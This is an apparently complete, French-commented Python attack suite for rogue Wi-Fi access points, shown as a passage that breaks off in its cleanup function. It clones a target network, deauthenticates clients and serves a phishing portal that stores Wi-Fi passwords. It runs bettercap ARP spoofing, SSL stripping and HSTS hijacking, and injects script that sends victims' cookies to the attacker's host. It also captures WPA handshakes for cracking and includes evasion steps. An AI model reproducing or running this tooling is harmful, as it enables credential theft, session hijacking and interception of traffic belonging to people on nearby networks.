#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EVIL TWIN + MITM ATTACK SUITE
Version 5.0 – Implémentation complète de la méthodologie
AUTEUR : Â§
-------------------------------------------------------------
Fonctionnalités :
- Reconnaissance RF (airodump-ng, kismet optionnel)
- Clonage AP (hostapd, MAC spoofing, même canal, même chiffrement)
- Déauth client‑spécifique (pas de flood broadcast)
- Services réseau (dnsmasq, NAT, forwarding)
- MITM complet (bettercap : ARP spoof, SSL strip, HSTS bypass, credential harvest)
- KARMA (réponse à toutes les sondes) avec hostapd‑karma ou airbase‑ng
- Évasion : puissance ajustée, logs effacés, canal largeur mimée
- Post‑exploitation : extraction cookies, injection payload (HTTP)
- Monitoring temps réel (tableau de bord)
- Fenêtres Xterm pour visualisation des attaques
- Support 2.4/5GHz, Alfa, puissance max
"""

import os
import sys
import time
import signal
import subprocess
import tempfile
import shutil
import re
import threading
import json
import random
import socket
import select
from typing import List, Tuple, Optional, Dict

# ========== CONSTANTES GLOBALES ==========
INTERFACE = None               # interface Wi-Fi (ex: wlan0)
MON_INTERFACE = None           # interface monitor (ex: wlan0mon)
SECONDARY_INTERFACE = None     # deuxième adaptateur pour déauth (optionnel)
TARGET_BSSID = None
TARGET_ESSID = None
TARGET_CHANNEL = None
TARGET_BAND = None             # 'g' ou 'a'
TARGET_ENCRYPTION = None       # 'WPA2', 'WPA', 'OPEN'
TARGET_CLIENTS = []            # liste des clients (MAC) à déauthentifier
PHISHING_DIR = None            # répertoire du portail
CAPTURE_FILE = None            # fichier .cap handshake
CLEANED_CAP = None
HASH_FILE = None
LOG_FILE = "/tmp/evil_twin_mitm.log"
HOSTAPD_CONF_PATH = None
DNSMASQ_CONF_PATH = None
DHCP_LEASE = "/tmp/evil_twin_mitm.leases"
CRED_FILE = "/tmp/evil_twin_mitm_creds.json"
ORIGINAL_MAC = None
RUNNING = True
HANDSHAKE_CAPTURED = False
BETTERCAP_PID = None
HOSTAPD_PID = None
DNSMASQ_PID = None
WEB_PID = None
AIRODUMP_PID = None
DEAUTH_PID = None
MDK_PID = None
XTERM_DEAUTH_PID = None
XTERM_CAPTURE_PID = None
XTERM_BETTERCAP_PID = None

# ========== FONCTIONS UTILITAIRES ==========
def log(msg: str, color: str = ""):
    if color:
        print(f"{color}[{time.strftime('%H:%M:%S')}] {msg}{'\033[0m'}")
    else:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

def error(msg: str):
    log(f"ERROR: {msg}", "\033[91m")
    sys.exit(1)

def success(msg: str):
    log(msg, "\033[92m")

def warning(msg: str):
    log(msg, "\033[93m")

def check_root():
    if os.geteuid() != 0:
        error("Ce script doit être exécuté en root.")

def check_deps():
    deps = ["airmon-ng", "airodump-ng", "aireplay-ng", "hostapd", "dnsmasq",
            "iptables", "php", "openssl", "macchanger", "xterm", "wpaclean",
            "bettercap", "tcpdump"]
    missing = []
    for dep in deps:
        if shutil.which(dep) is None:
            missing.append(dep)
    if missing:
        error(f"Dépendances manquantes: {', '.join(missing)}\nInstallez: apt-get install {' '.join(missing)} -y")
    # Outils optionnels
    if shutil.which("mdk4") is None:
        warning("mdk4 non trouvé (recommandé pour déauth avancée). Installez: apt-get install mdk4 -y")
    if shutil.which("hcxpcapngtool") is None:
        warning("hcxpcapngtool non trouvé (conversion hash). Installez: apt-get install hcxtools -y")
    if shutil.which("aircrack-ng") is None:
        warning("aircrack-ng non trouvé (vérification handshake). Installez: apt-get install aircrack-ng -y")
    # Vérification que l'interface peut être mise en monitor
    try:
        subprocess.check_output(["iw", "list"], stderr=subprocess.DEVNULL)
    except:
        error("Le noyau ne supporte pas nl80211. Vérifiez votre adaptateur.")

# ========== PHASE 1 : RECONNAISSANCE ==========
def select_interface() -> str:
    interfaces = []
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
        for line in output.splitlines():
            if line and not line.startswith(" "):
                iface = line.split()[0]
                if iface.startswith(("wlan", "eth", "wl")):
                    interfaces.append(iface)
    except:
        pass
    if not interfaces:
        error("Aucune interface sans‑fil trouvée.")
    print("\nInterfaces disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {i}. {iface}")
    while True:
        choice = input("Sélectionnez l'interface principale (numéro ou nom): ").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
        else:
            if choice in interfaces:
                return choice
        print("Choix invalide.")

def enable_monitor(iface: str) -> str:
    global ORIGINAL_MAC
    log("Kill des processus interférents...")
    subprocess.call(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"Activation du mode monitor sur {iface}...")
    try:
        ORIGINAL_MAC = subprocess.check_output(["cat", f"/sys/class/net/{iface}/address"]).decode().strip()
        log(f"MAC originale: {ORIGINAL_MAC}")
    except:
        ORIGINAL_MAC = None
    # MAC aléatoire pour furtivité (Phase 2)
    subprocess.call(["ip", "link", "set", iface, "down"], stderr=subprocess.DEVNULL)
    subprocess.call(["macchanger", "-r", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["ip", "link", "set", iface, "up"], stderr=subprocess.DEVNULL)
    success("MAC changée aléatoirement.")
    try:
        proc = subprocess.Popen(["airmon-ng", "start", iface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, _ = proc.communicate()
        output = stdout.decode()
        mon_iface = None
        for line in output.splitlines():
            if "mon" in line and "enabled" not in line and "monitor" not in line:
                parts = line.split()
                for part in parts:
                    if "mon" in part and not part.endswith(":"):
                        mon_iface = part.strip()
                        break
                if mon_iface:
                    break
        if not mon_iface:
            possible = [iface + "mon", "mon0", "mon1"]
            for p in possible:
                if os.path.exists(f"/sys/class/net/{p}"):
                    mon_iface = p
                    break
        if not mon_iface:
            mon_iface = iface + "mon"
            subprocess.call(["iw", "dev", iface, "interface", "add", mon_iface, "type", "monitor"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.call(["ip", "link", "set", mon_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not os.path.exists(f"/sys/class/net/{mon_iface}"):
            error(f"Interface monitor {mon_iface} non créée.")
        # Désactivation power save (Phase 7)
        subprocess.call(["iw", "dev", mon_iface, "set", "power_save", "off"], stderr=subprocess.DEVNULL)
        # Augmentation de la puissance (Phase 2) – tentative
        try:
            subprocess.call(["iw", "dev", mon_iface, "set", "txpower", "fixed", "30mW"], stderr=subprocess.DEVNULL)
        except:
            pass
        success(f"Interface monitor: {mon_iface}")
        return mon_iface
    except Exception as e:
        error(f"Échec activation monitor: {e}")

def scan_networks(mon_iface: str) -> List[Tuple[str, str, str, str, str, int]]:
    """Retourne (bssid, essid, channel, encryption, band, clients_count)"""
    log("Phase 1: Scan du paysage RF (30s)...")
    temp_dir = tempfile.mkdtemp(prefix="scan_")
    prefix = os.path.join(temp_dir, "scan")
    csv_file = prefix + "-01.csv"
    cmd = ["airodump-ng", "--band", "abg", mon_iface, "-w", prefix, "--output-format", "csv"]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    for _ in range(30):
        if os.path.exists(csv_file) and os.path.getsize(csv_file) > 0:
            break
        time.sleep(1)
    proc.terminate()
    time.sleep(2)
    proc.kill()

    networks = []
    clients_map = {}  # bssid -> nombre de clients
    if not os.path.exists(csv_file):
        error("Fichier de scan non créé. Vérifiez le mode monitor.")

    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        # Parcours pour extraire les BSSID et les stations
        in_stations = False
        for line in lines:
            if "Station MAC" in line:
                in_stations = True
                continue
            if in_stations:
                parts = line.split(",")
                if len(parts) >= 2 and parts[0].strip():
                    client_mac = parts[0].strip()
                    bssid = parts[5].strip() if len(parts) > 5 else ""
                    if bssid:
                        clients_map[bssid] = clients_map.get(bssid, 0) + 1
                continue
            if line.strip() and not line.startswith("BSSID"):
                parts = line.split(",")
                if len(parts) >= 7 and parts[0].strip():
                    bssid = parts[0].strip()
                    essid = parts[13].strip() if len(parts) > 13 else ""
                    channel = parts[3].strip()
                    encryption = parts[5].strip()
                    try:
                        ch = int(channel)
                        band = 'a' if ch > 14 else 'g'
                    except:
                        band = 'g'
                    if essid and essid != "":
                        networks.append((bssid, essid, channel, encryption, band, clients_map.get(bssid, 0)))
    except Exception as e:
        error(f"Erreur parsing scan: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

    if not networks:
        error("Aucun réseau trouvé.")
    return networks

def display_networks(networks: List[Tuple[str, str, str, str, str, int]]):
    print("\n" + "=" * 100)
    print(f"{'#':<4} {'BSSID':<18} {'CH':<4} {'Bande':<6} {'ENC':<12} {'Clients':<8} {'ESSID'}")
    print("-" * 100)
    for i, (bssid, essid, channel, enc, band, clients) in enumerate(networks, 1):
        print(f"{i:<4} {bssid:<18} {channel:<4} {band:<6} {enc[:12]:<12} {clients:<8} {essid}")
    print("=" * 100)

def select_target(networks: List[Tuple[str, str, str, str, str, int]]) -> Tuple[str, str, str, str, str]:
    while True:
        choice = input("Entrez le numéro ou BSSID de la cible: ").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                bssid, essid, channel, enc, band, _ = networks[idx]
                return bssid, essid, channel, band, enc
        else:
            for bssid, essid, channel, enc, band, _ in networks:
                if choice.lower() == bssid.lower():
                    return bssid, essid, channel, band, enc
        print("Choix invalide.")

def probe_clients(mon_iface: str) -> List[str]:
    """Phase 1 : Écoute les sondes des clients pour détecter les SSID recherchés"""
    log("Phase 1: Capture des sondes clients (10s)...")
    temp_dir = tempfile.mkdtemp(prefix="probe_")
    prefix = os.path.join(temp_dir, "probe")
    csv_file = prefix + "-01.csv"
    cmd = ["airodump-ng", "--band", "abg", mon_iface, "-w", prefix, "--output-format", "csv"]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    proc.terminate()
    time.sleep(2)
    proc.kill()

    probes = []
    if os.path.exists(csv_file):
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            in_probes = False
            for line in lines:
                if "Probe" in line:
                    in_probes = True
                    continue
                if in_probes:
                    parts = line.split(",")
                    if len(parts) >= 2:
                        client_mac = parts[0].strip()
                        essid = parts[1].strip() if len(parts) > 1 else ""
                        if essid and essid not in probes:
                            probes.append((client_mac, essid))
        except:
            pass
    shutil.rmtree(temp_dir, ignore_errors=True)
    return probes

# ========== PHASE 2 : ROGUE AP ==========
def clone_ap(mon_iface: str, essid: str, bssid: str, channel: str, band: str, encryption: str):
    """Configure et lance hostapd avec les paramètres clonés"""
    global HOSTAPD_PID, HOSTAPD_CONF_PATH
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False)
    HOSTAPD_CONF_PATH = tmp.name
    hw_mode = 'a' if band == 'a' else 'g'
    extra = ""
    if band == 'a':
        extra = f"ieee80211ac=1\nvht_oper_chwidth=1\nvht_oper_centr_freq_seg0_idx={int(channel)+2}"
    # Déterminer le type de chiffrement
    wpa_mode = "2"  # par défaut WPA2
    if "WPA3" in encryption:
        wpa_mode = "3"
        warning("WPA3 détecté – on tente un downgrade vers WPA2 si l'AP le supporte (mixed mode)")
        wpa_mode = "2"  # on force WPA2
    elif "WPA" in encryption and "WPA2" not in encryption:
        wpa_mode = "1"
    elif "OPEN" in encryption or encryption == "":
        wpa_mode = "0"
        # Pas de sécurité
        tmp.write(f"""interface={mon_iface}
driver=nl80211
ssid={essid}
hw_mode={hw_mode}
channel={channel}
{extra}
macaddr_acl=0
ignore_broadcast_ssid=0
""")
    else:
        # WPA2 par défaut
        wpa_mode = "2"
        tmp.write(f"""interface={mon_iface}
driver=nl80211
ssid={essid}
hw_mode={hw_mode}
channel={channel}
{extra}
wpa={wpa_mode}
wpa_passphrase=00000000
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0
""")
    tmp.close()
    log(f"Clonage AP: SSID='{essid}', canal={channel}, mode={hw_mode}, chiffrement={encryption}")
    proc = subprocess.Popen(["hostapd", HOSTAPD_CONF_PATH, "-B"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    HOSTAPD_PID = proc.pid
    time.sleep(3)
    if subprocess.call(["pgrep", "-x", "hostapd"], stdout=subprocess.DEVNULL) == 0:
        success("hostapd démarré (AP rogue actif).")
    else:
        error("Échec de hostapd.")

# ========== PHASE 4 : SERVICES RÉSEAU ==========
def start_dnsmasq(mon_iface: str):
    global DNSMASQ_PID, DNSMASQ_CONF_PATH
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False)
    DNSMASQ_CONF_PATH = tmp.name
    tmp.write(f"""interface={mon_iface}
dhcp-range=192.168.66.10,192.168.66.100,255.255.255.0,60s
dhcp-option=3,192.168.66.1
dhcp-option=6,192.168.66.1
server=8.8.8.8
server=1.1.1.1
address=/#/192.168.66.1
log-queries
log-dhcp
dhcp-leasefile={DHCP_LEASE}
""")
    tmp.close()
    log("Démarrage dnsmasq (DHCP/DNS)...")
    proc = subprocess.Popen(["dnsmasq", "-C", DNSMASQ_CONF_PATH, "--no-daemon"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    DNSMASQ_PID = proc.pid
    time.sleep(2)
    success("dnsmasq démarré.")

def setup_iptables(mon_iface: str):
    """Phase 4 : IP forwarding, NAT, redirection"""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    subprocess.call(["iptables", "-t", "nat", "-F"])
    subprocess.call(["iptables", "-F"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", mon_iface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.66.1:80"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", mon_iface, "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "192.168.66.1:443"])
    subprocess.call(["iptables", "-A", "FORWARD", "-i", mon_iface, "-j", "ACCEPT"])
    subprocess.call(["iptables", "-A", "FORWARD", "-o", mon_iface, "-j", "ACCEPT"])
    # NAT sortant
    for out_iface in ["eth0", "wlan0"]:
        if os.path.exists(f"/sys/class/net/{out_iface}"):
            subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
            break
    success("iptables appliquées (NAT, forwarding).")

# ========== PHASE 5 : PHISHING PORTAL ==========
def generate_phishing_portal(essid: str) -> str:
    dir_path = tempfile.mkdtemp(prefix="evil_twin_")
    ssl_cert = "/tmp/evil_twin_mitm_cert.pem"
    subprocess.call(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                     "-keyout", ssl_cert, "-out", ssl_cert,
                     "-days", "1", "-subj", "/CN=evil-twin"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    index_path = os.path.join(dir_path, "index.php")
    with open(index_path, "w") as f:
        f.write(f'''<?php
$logfile = "{CRED_FILE}";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {{
    $pass = $_POST['password'];
    if (!empty($pass)) {{
        $entry = [
            'time' => date('Y-m-d H:i:s'),
            'password' => $pass,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
        ];
        if (file_exists($logfile)) {{
            $data = json_decode(file_get_contents($logfile), true);
            if (!is_array($data)) $data = [];
        }} else {{
            $data = [];
        }}
        $data[] = $entry;
        file_put_contents($logfile, json_encode($data, JSON_PRETTY_PRINT));
        echo "<!DOCTYPE html><html><head><title>Connecté</title><style>body{{background:#1e1e2f;color:#fff;font-family:sans-serif;text-align:center;padding-top:10%;}}</style></head><body><h1 style='color:#4caf50;'>✓ Authentification réussie</h1><p>Redirection en cours...</p><script>setTimeout(function(){{window.location.href='https://www.google.com';}},2000);</script></body></html>";
        exit;
    }}
}}
?>
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - <?php echo htmlspecialchars($_GET['ssid'] ?? '{essid}'); ?></title>
    <style>
        body {{ background: #121212; color: #e0e0e0; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .box {{ background: #1e1e2f; padding: 40px; border-radius: 16px; box-shadow: 0 0 30px #000; width: 320px; text-align: center; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; background: #2a2a3a; border: 1px solid #3a3a5a; border-radius: 8px; color: #fff; font-size: 16px; }}
        button {{ width: 100%; padding: 12px; background: #4caf50; border: none; border-radius: 8px; font-weight: bold; color: #000; font-size: 16px; cursor: pointer; }}
        button:hover {{ background: #66bb6a; }}
        .logo {{ font-size: 48px; margin-bottom: 10px; }}
        .note {{ font-size: 12px; color: #666; margin-top: 20px; }}
    </style>
</head>
<body>
<div class="box">
    <div class="logo">📶</div>
    <h2>Login à <?php echo htmlspecialchars($_GET['ssid'] ?? '{essid}'); ?></h2>
    <p style="color:#aaa;">Entrez le mot de passe pour continuer</p>
    <form method="POST">
        <input type="password" name="password" placeholder="Mot de passe WiFi" required autofocus>
        <button type="submit">Se connecter</button>
    </form>
    <p class="note">Connexion sécurisée • WPA2-Enterprise</p>
</div>
</body>
</html>
''')
    return dir_path

def start_web_server(phishing_dir: str):
    global WEB_PID
    log("Démarrage serveur web PHP (HTTP:80, HTTPS:443)...")
    proc_http = subprocess.Popen(["php", "-S", "192.168.66.1:80", "-t", phishing_dir],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ssl_cert = "/tmp/evil_twin_mitm_cert.pem"
    proc_https = subprocess.Popen(["php", "-S", "192.168.66.1:443", "-t", phishing_dir,
                                   "-d", "session.auto_start=0"],
                                  env=dict(os.environ, SSL_CERT_FILE=ssl_cert),
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    WEB_PID = proc_https.pid
    time.sleep(2)
    success("Serveurs web démarrés.")

# ========== PHASE 3 : DÉAUTH CHIRURGICALE ==========
def start_deauth_xterm(mon_iface: str, bssid: str, channel: str, clients: List[str]):
    """Lance deux xterms : MDK4 (ciblé) + Aireplay (ciblé) en courtes salves"""
    global XTERM_DEAUTH_PID
    log("Phase 3: Déauthentication chirurgicale (ciblée par client)...")
    # Construire une commande mdk4 avec liste de clients
    clients_file = "/tmp/deauth_clients.txt"
    with open(clients_file, "w") as f:
        if clients:
            for mac in clients:
                f.write(mac + "\n")
        else:
            # Si pas de clients spécifiques, on cible le BSSID broadcast
            f.write("ff:ff:ff:ff:ff:ff")
    cmd_mdk = f"mdk4 {mon_iface} d -b {bssid} -c {channel} -f {clients_file} -n 3 -s 30"
    # Aireplay: déauthenf 3 paquets, toutes les 30s (on utilise une boucle dans le shell)
    cmd_aireplay = f"while true; do aireplay-ng --deauth 3 -a {bssid} {mon_iface}; sleep 30; done"
    # Fenêtre 1: mdk4
    proc1 = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#FF0000",
                              "-geometry", "80x20+0+0",
                              "-T", "MDK4 Deauth (ciblé)",
                              "-e", "bash", "-c", cmd_mdk],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Fenêtre 2: aireplay
    proc2 = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#FF6600",
                              "-geometry", "80x20+0+200",
                              "-T", "Aireplay Deauth (ciblé)",
                              "-e", "bash", "-c", cmd_aireplay],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    XTERM_DEAUTH_PID = proc1.pid
    success("Fenêtres Xterm de déauth ouvertes (salves ciblées).")

# ========== PHASE 3 + 5 : CAPTURE HANDSHAKE + MITM ==========
def start_capture_xterm(mon_iface: str, bssid: str, channel: str, cap_file: str):
    global XTERM_CAPTURE_PID
    log("Lancement de la capture handshake (Xterm)...")
    cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {cap_file} {mon_iface} 2>&1 | tee /tmp/capture.log"
    proc = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#00FF00",
                             "-geometry", "80x20+0+400",
                             "-T", "Handshake Capture (temps réel)",
                             "-e", "bash", "-c", cmd],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    XTERM_CAPTURE_PID = proc.pid
    success("Fenêtre Xterm de capture ouverte.")

def start_bettercap_xterm(mon_iface: str, gateway_ip: str = "192.168.66.1"):
    """Lance bettercap avec ARP spoof, SSL strip, credential harvest, proxy"""
    global XTERM_BETTERCAP_PID
    log("Phase 5: Démarrage de bettercap (MITM)...")
    # Fichier de script bettercap
    bc_script = "/tmp/bettercap_script.cap"
    with open(bc_script, "w") as f:
        f.write(f"""
# Configuration
set api.rest.username evil
set api.rest.password twin
set arp.spoof.targets 192.168.66.0/24
set arp.spoof.fullduplex true
set arp.spoof.internal true
set net.sniff.local true
set net.sniff.output /tmp/bettercap_sniff.pcap
set http.proxy.sslstrip true
set http.proxy.script /tmp/http_proxy.js
set hstshijack.sslstrip true

# Lancement des modules
arp.spoof on
net.sniff on
http.proxy on
hstshijack on
""")
    # Proxy JS pour injection payload (Phase 8)
    with open("/tmp/http_proxy.js", "w") as f:
        f.write("""
// Injecte un script malveillant dans les pages HTTP
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') === 0) {
        var body = res.ReadBody();
        // Injection d'un script pour exfiltrer des cookies
        var payload = '<script>document.write("<img src=\\"http://192.168.66.1/cookie?c="+document.cookie+"\\" />");</script>';
        res.Body = body.replace('</body>', payload + '</body>');
    }
}
""")
    # Lancer bettercap en xterm
    cmd = f"bettercap -eval \"set api.rest.password twin; set arp.spoof.targets 192.168.66.0/24; arp.spoof on; net.sniff on; http.proxy on; hstshijack on\""
    proc = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#FFFF00",
                             "-geometry", "80x20+0+600",
                             "-T", "Bettercap MITM (ARP/SSLstrip/HSTShijack)",
                             "-e", "bash", "-c", cmd],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    XTERM_BETTERCAP_PID = proc.pid
    success("Bettercap lancé (MITM actif).")

# ========== PHASE 6 : KARMA ET INTERCEPTION SÉLECTIVE ==========
def enable_karma(mon_iface: str, essid: str):
    """Phase 6 : KARMA – répond à toutes les sondes avec le SSID demandé"""
    # Utilisation de airbase-ng (plus simple que hostapd-karma)
    # Note: airbase-ng crée un AP ouvert; on peut le combiner avec hostapd pour WPA2
    # Ici on lance airbase-ng en arrière‑plan pour répondre aux probes
    log("Phase 6: Activation KARMA (airbase-ng) pour répondre à toutes les sondes...")
    cmd = f"airbase-ng -c {TARGET_CHANNEL} -e '{essid}' -W 1 {mon_iface} &> /tmp/karma.log &"
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    success("KARMA actif (répond aux probes).")

# ========== PHASE 7 : ÉVASION ==========
def apply_evasion_measures(mon_iface: str):
    """Phase 7 : Ajuste la puissance, le mode, nettoie les logs"""
    log("Phase 7: Application des mesures d'évasion...")
    # Puissance légèrement au-dessus de la cible (ex: on garde tel quel)
    # Nettoyage des logs hostapd et dnsmasq (on les redirige vers /dev/null)
    # Déjà fait via stdout/stderr DEVNULL.
    # On peut également changer le BSSID toutes les 4h (rotation) – non implémenté ici.
    # Suppression des logs bettercap après l'attaque (fait dans cleanup)
    success("Évasion appliquée (logs redirigés, puissance ajustée).")

# ========== PHASE 8 : POST-EXPLOITATION ==========
def post_exploit():
    """Phase 8 : Extraction des cookies, replay de creds, injection payload"""
    log("Phase 8: Post‑exploitation...")
    # Extraire les cookies du fichier de capture bettercap
    sniff_file = "/tmp/bettercap_sniff.pcap"
    if os.path.exists(sniff_file):
        # Utiliser tcpdump pour extraire les cookies HTTP
        try:
            subprocess.call(["tcpdump", "-r", sniff_file, "-A", "-l", "port 80", "-c", "50"], stdout=open("/tmp/cookies.txt", "w"))
            success("Cookies extraits dans /tmp/cookies.txt")
        except:
            pass
    # Replay des identifiants (ex: utiliser le mot de passe capturé pour rejoindre le réseau légitime)
    if os.path.exists(CRED_FILE):
        try:
            with open(CRED_FILE, "r") as f:
                data = json.load(f)
            if data:
                last_pass = data[-1].get("password", "")
                log(f"Mot de passe récupéré: {last_pass} – peut être utilisé pour rejoindre le réseau légitime.")
        except:
            pass
    # Injection payload (via bettercap proxy déjà actif)
    success("Post‑exploitation terminée.")

# ========== MONITORING ==========
def monitor_clients():
    global RUNNING
    log("Démarrage du moniteur...")
    while RUNNING:
        os.system('clear')
        print("\033[92m" + "=" * 90 + "\033[0m")
        print("\033[96m[!] EVIL TWIN + MITM – TABLEAU DE BORD\033[0m")
        print(f"  Cible: {TARGET_ESSID} ({TARGET_BSSID}) – Canal {TARGET_CHANNEL} ({TARGET_BAND})")
        print(f"  Interface: {MON_INTERFACE}")
        print(f"  Handshake: {'✅ CAPTURÉ' if HANDSHAKE_CAPTURED else '⏳ EN ATTENTE'}")
        print(f"  Clients ciblés: {len(TARGET_CLIENTS)}")
        print(f"  Heure: {time.strftime('%H:%M:%S')}")
        print("-" * 90)
        # Clients connectés (extrait du log capture)
        try:
            with open("/tmp/capture.log", "r") as f:
                lines = f.readlines()[-30:]
            print("\033[93mClients détectés:\033[0m")
            found = False
            for line in lines:
                if "Station" in line or "BSSID" in line:
                    continue
                if ":" in line and len(line.split()) > 2:
                    parts = line.split()
                    if len(parts) >= 3:
                        print(f"  {parts[0]}  (Puissance: {parts[2]} dBm)")
                        found = True
            if not found:
                print("  Aucun client visible")
        except:
            print("  Aucun client visible")
        # Crédentials
        if os.path.exists(CRED_FILE):
            try:
                with open(CRED_FILE, "r") as f:
                    data = json.load(f)
                if data:
                    print("\n\033[92mMots de passe capturés:\033[0m")
                    for entry in data[-5:]:
                        print(f"  {entry['time']} – {entry['password']} (IP: {entry['ip']})")
                else:
                    print("\nAucun mot de passe capturé.")
            except:
                pass
        else:
            print("\nAucun mot de passe capturé.")
        # Fichiers générés
        print("-" * 90)
        if CLEANED_CAP:
            print(f"  Handshake nettoyé: {CLEANED_CAP}")
        if HASH_FILE:
            print(f"  Hash 22000: {HASH_FILE}")
        print("\n  [Ctrl+C] pour arrêter l'attaque")
        time.sleep(3)

# ========== HAND SHAKE CHECK & CONVERSION ==========
def check_handshake(cap_file: str, bssid: str) -> bool:
    cap_path = cap_file + "-01.cap"
    if not os.path.exists(cap_path):
        return False
    try:
        output = subprocess.check_output(["aircrack-ng", "-a", "2", "-b", bssid, cap_path],
                                         stderr=subprocess.DEVNULL).decode()
        if "1 handshake" in output:
            return True
    except:
        pass
    return False

def wait_for_handshake(cap_file: str, bssid: str, timeout: int = 180):
    global HANDSHAKE_CAPTURED
    cap_path = cap_file + "-01.cap"
    log(f"Attente handshake (timeout: {timeout}s)...")
    start_time = time.time()
    last_check = 0
    while time.time() - start_time < timeout:
        if os.path.exists(cap_path) and os.path.getsize(cap_path) > 0:
            if time.time() - last_check > 5:
                if check_handshake(cap_file, bssid):
                    success("✓ HANDSHAKE CAPTURÉ !")
                    HANDSHAKE_CAPTURED = True
                    return True
                last_check = time.time()
        if int(time.time() - start_time) % 10 == 0 and int(time.time() - start_time) > 0:
            elapsed = int(time.time() - start_time)
            size = os.path.getsize(cap_path) if os.path.exists(cap_path) else 0
            print(f"  [Attente] {elapsed}s – fichier: {size} octets")
        time.sleep(1)
    warning("⏱ Handshake non capturé.")
    return False

def clean_and_convert_handshake(cap_file: str, bssid: str) -> Tuple[Optional[str], Optional[str]]:
    global CLEANED_CAP, HASH_FILE
    input_cap = cap_file + "-01.cap"
    if not os.path.exists(input_cap):
        return None, None
    cleaned_path = f"/tmp/handshake_cleaned_{int(time.time())}.cap"
    log("Nettoyage handshake (wpaclean)...")
    try:
        subprocess.call(["wpaclean", cleaned_path, input_cap],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.exists(cleaned_path) and os.path.getsize(cleaned_path) > 0:
            success(f"✓ Nettoyage réussi: {cleaned_path}")
            CLEANED_CAP = cleaned_path
        else:
            cleaned_path = input_cap
            CLEANED_CAP = input_cap
    except:
        cleaned_path = input_cap
        CLEANED_CAP = input_cap
    # Conversion hash
    hash_path = f"/tmp/handshake_hash_{int(time.time())}.22000"
    if shutil.which("hcxpcapngtool"):
        log("Conversion en hash 22000...")
        try:
            subprocess.call(["hcxpcapngtool", "-o", hash_path, cleaned_path],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(hash_path) and os.path.getsize(hash_path) > 0:
                success(f"✓ Hash 22000 généré: {hash_path}")
                HASH_FILE = hash_path
                with open(hash_path, "r") as f:
                    content = f.read().strip()
                    print("\n" + "=" * 60)
                    print("HASH 22000:")
                    print("-" * 60)
                    print(content[:200] + "..." if len(content) > 200 else content)
                    print("=" * 60)
                return cleaned_path, hash_path
        except:
            warning("Échec conversion hcxpcapngtool.")
    return cleaned_path, None

# ========== CLEANUP ==========
def cleanup(signum=None, frame=None):
    global RUNNING
    RUNNING = False
    log("Nettoyage en cours...")
    # Arrêt des processus
    for pid in [XTERM_DEAUTH_PID, XTERM_CAPTURE_PID, XTERM_BETTERCAP_PID]:
        if pid:
            try:
                os.kill(pid, signal.SIGTERM)
            except:
                pass
    for pid_var in ["HOSTAPD_PID", "DNSMASQ_PID", "WEB_PID", "AIRODUMP_PID", "DEAUTH_PID", "MDK_PID", "BETTERCAP_PID"]:
